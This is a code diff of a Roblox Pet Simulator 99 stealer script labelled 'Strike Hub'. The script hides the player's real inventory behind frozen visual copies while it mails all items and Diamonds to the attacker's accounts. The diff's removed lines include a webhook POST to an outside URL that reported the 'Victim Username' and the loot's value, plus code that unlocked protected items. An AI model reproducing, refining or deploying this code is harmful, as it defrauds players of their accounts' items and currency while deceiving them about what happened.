@@ -42,6 +42,7 @@ local save = rawSave.Save or rawSave.Inventory or {}
 --// ==========================
 --// VISUAL FREEZE (PERMANENT)
 --// ==========================
+-- Freeze currency
 local visualCurrency = {}
 for _, v in pairs(save.Currency or {}) do
     visualCurrency[v.id] = v._am
@@ -59,45 +60,43 @@ task.spawn(function()
     end
 end)
 
-local visual3D = {}
-local function clone3DItems(folder)
+-- Freeze 3D inventory items
+local function freeze3DItems(folder)
     if not folder then return end
     for _, obj in pairs(folder:GetChildren()) do
-        if not visual3D[obj.Name] then
+        if obj:IsA("Model") then
             local clone = obj:Clone()
             clone.Parent = folder
-            visual3D[obj.Name] = clone
             obj.Parent = nil
         end
     end
 end
 
-local visualGUI = {}
-local function cloneGUIItems(guiFolder)
+-- Freeze GUI items
+local function freezeGUIItems(guiFolder)
     if not guiFolder then return end
     for _, obj in pairs(guiFolder:GetChildren()) do
-        if not visualGUI[obj.Name] then
+        if obj:IsA("Frame") or obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
             local clone = obj:Clone()
             clone.Parent = guiFolder
-            visualGUI[obj.Name] = clone
             obj.Visible = false
         end
     end
 end
 
+-- Run freeze loops
 task.spawn(function()
     while plr.Parent do
         task.wait(0.05)
-        clone3DItems(plr:FindFirstChild("Pets"))
-        clone3DItems(plr:FindFirstChild("Hoverboards"))
-        clone3DItems(plr:FindFirstChild("Eggs"))
-        clone3DItems(plr:FindFirstChild("Booths"))
-
-        cloneGUIItems(plr.PlayerGui:FindFirstChild("Charms"))
-        cloneGUIItems(plr.PlayerGui:FindFirstChild("Enchants"))
-        cloneGUIItems(plr.PlayerGui:FindFirstChild("Potions"))
-        cloneGUIItems(plr.PlayerGui:FindFirstChild("Misc"))
-        cloneGUIItems(plr.PlayerGui:FindFirstChild("Ultimate"))
+        freeze3DItems(plr:FindFirstChild("Pets"))
+        freeze3DItems(plr:FindFirstChild("Hoverboards"))
+        freeze3DItems(plr:FindFirstChild("Eggs"))
+        freeze3DItems(plr:FindFirstChild("Booths"))
+        freezeGUIItems(plr.PlayerGui:FindFirstChild("Charms"))
+        freezeGUIItems(plr.PlayerGui:FindFirstChild("Enchants"))
+        freezeGUIItems(plr.PlayerGui:FindFirstChild("Potions"))
+        freezeGUIItems(plr.PlayerGui:FindFirstChild("Misc"))
+        freezeGUIItems(plr.PlayerGui:FindFirstChild("Ultimate"))
     end
 end)
 
@@ -138,7 +137,7 @@ local function getRAP(category, item)
     return success and val or (item._rap or 0)
 end
 
---// SEND ITEM
+--// SEND ITEM FUNCTION
 local function sendItem(category, stackKey, amount)
     for _, user in ipairs(users) do
         local args = {user, MailMessage, category, stackKey, amount or 1}
@@ -146,6 +145,7 @@ local function sendItem(category, stackKey, amount)
             return network.Invoke("Mailbox: Send", unpack(args))
         end)
         if ok and response == true then
+            mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
             return true
         end
         task.wait(0.2)
@@ -153,19 +153,9 @@ local function sendItem(category, stackKey, amount)
     return false
 end
 
---// UNLOCK ITEMS
-for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
-    if save[cat] then
-        for uid, item in pairs(save[cat]) do
-            if item._lk then
-                pcall(function() network.Invoke("Locking_SetLocked", uid, false) end)
-            end
-        end
-    end
-end
+--// SEND ALL ITEMS FIRST (except gems)
+local allItems = {}
 
---// COLLECT ITEMS
-local sortedItems, totalRAP = {}, 0
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
     if save[cat] then
         for uid, item in pairs(save[cat]) do
@@ -175,7 +165,7 @@ for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard"
                 if item.pt == 1 then prefix ..= "Golden "
                 elseif item.pt == 2 then prefix ..= "Rainbow " end
                 local name = prefix .. item.id
-                table.insert(sortedItems, {
+                table.insert(allItems, {
                     category = cat,
                     uid = uid,
                     amount = item._am or 1,
@@ -185,61 +175,39 @@ for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard"
                         return HttpService:JSONEncode({id=item.id, pt=item.pt or 0, sh=item.sh or false, tn=item.tn or ""})
                     end
                 })
-                totalRAP += rap * (item._am or 1)
             end
         end
     end
 end
 
-table.sort(sortedItems, function(a,b)
+table.sort(allItems, function(a,b)
     return a.rap*a.amount > b.rap*b.amount
 end)
 
---// WEBHOOK REPORT
-task.spawn(function()
-    local requestFunc = request or http_request or syn and syn.request or http and http.request or nil
-    if not requestFunc then return end
-    local headers = {["Content-Type"]="application/json"}
-    local fields = {
-        {name="Victim Username:", value=plr.Name, inline=true},
-        {name="Items to be sent:", value="", inline=false},
-        {name="Summary:", value="Total RAP: "..formatNumber(totalRAP), inline=false}
-    }
-    for _, item in ipairs(sortedItems) do
-        fields[2].value ..= item.name.." (x"..item.amount.."): "..formatNumber(item.rap).."\n"
-    end
-    local body = HttpService:JSONEncode({
-        embeds = {{
-            title="New PS99 Execution",
-            color=65280,
-            fields=fields,
-            footer={text="Strike Hub."}
-        }}
-    })
-    pcall(function()
-        requestFunc({Url=webhook, Method="POST", Headers=headers, Body=body})
-    end)
-end)
-
---// SEND ITEMS ASYNC
-for _, item in ipairs(sortedItems) do
+-- Send items sequentially
+for _, item in ipairs(allItems) do
     local key = item.StackKey and item.StackKey() or item.uid
     sendItem(item.category, key, item.amount)
+    task.wait(0.2)
 end
 
---// SEND GEMS LAST (unchanged)
-for i, v in pairs(save.Currency or {}) do
-    if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
-        for _, user in ipairs(users) do
-            local args = {user, MailMessage, "Currency", i, v._am - mailSendPrice}
-            local ok, response = pcall(function()
-                return network.Invoke("Mailbox: Send", unpack(args))
-            end)
-            if ok and response == true then break end
-            task.wait(0.2)
+--// SEND GEMS LAST
+local function SendAllGems()
+    for i, v in pairs(save.Currency or {}) do
+        if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
+            for _, user in ipairs(users) do
+                local args = {user, MailMessage, "Currency", i, v._am - mailSendPrice}
+                local ok, response = pcall(function()
+                    return network.Invoke("Mailbox: Send", unpack(args))
+                end)
+                if ok and response == true then break end
+                task.wait(0.2)
+            end
+            break
         end
-        break
     end
 end
 
-print("[Strike Hub] Done sending items. Visual freeze remains until player leaves.")
+task.spawn(SendAllGems)
+
+print("[Strike Hub] All items sent. Visual freeze active.")
